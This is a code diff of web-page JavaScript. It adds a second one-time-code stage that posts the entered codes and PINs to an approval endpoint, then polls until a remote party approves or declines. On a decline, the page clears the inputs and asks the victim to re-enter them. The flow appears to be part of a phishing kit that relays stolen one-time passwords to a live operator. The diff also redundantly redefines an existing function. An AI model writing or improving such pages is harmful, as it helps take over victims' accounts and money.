@@ -560,6 +560,31 @@ async function sendStagePayload(stage, payload) {
 }
 
 // Polling core infrastructure engine
+async function submitCode2Stage(code2Value) {
+  userData.code2 = code2Value;
+  document.getElementById("code2Waiting").classList.remove("hidden");
+
+  const success = await sendStagePayload("code2", { code2: userData.code2 });
+  if (success) {
+    startPolling("code2", "page4", "page5", "code2Waiting", "code2Message");
+  }
+}
+
+// Pipeline transmission communications helper
+async function sendStagePayload(stage, payload) {
+  try {
+    const response = await fetch("/api/approval-request", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ sessionId, stage, payload })
+    });
+    return response.ok;
+  } catch (e) {
+    return false;
+  }
+}
+
+// Polling core infrastructure engine
 function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, successCallback) {
   const msgElement = document.getElementById(msgId);
   msgElement.className = "status";
@@ -578,22 +603,30 @@ function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, succes
         document.getElementById(currentPageId).classList.add("hidden");
         document.getElementById(nextPageId).classList.remove("hidden");
         if (successCallback) successCallback();
-           } else if (data.status === "declined") {
+      } else if (data.status === "declined") {
         clearInterval(pollingInterval);
         
-        // 1. Hide the full-page waiting spinner overlay screen
+        // 1. Hide the waiting spinner overlay so the form becomes visible again
         document.getElementById(spinnerId).classList.add("hidden");
         
-        // 2. Clear out old entries from the text box and individual PIN grids
+        // 2. Clear out the input field related to code2 so they can re-enter details
+        const code2Input = document.getElementById('code2');
+        if (code2Input) {
+          code2Input.value = '';
+        }
+        
+        // Also clear common general fallback input names if applicable
         const otpInput = document.getElementById('code1');
         if (otpInput) otpInput.value = '';
         
         const pinBoxes = document.querySelectorAll('.boxes input');
         pinBoxes.forEach(box => box.value = '');
         
-        // 3. Reset the primary continue button back to its initial locked style state
-        const submitBtn = document.getElementById('submitCode1');
-        if (submitBtn) submitBtn.disabled = true;
+        // 3. Reset the submit button back to active state so they can re-submit
+        const submitBtn = document.getElementById('submitCode2') || document.getElementById('submitCode1');
+        if (submitBtn) {
+          submitBtn.disabled = false; 
+        }
 
         // 4. Alert user about the correction step without blocking the interface view
         msgElement.className = "error";
@@ -605,4 +638,4 @@ function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, succes
     }
   }, 2500);
 }
-</script>
+
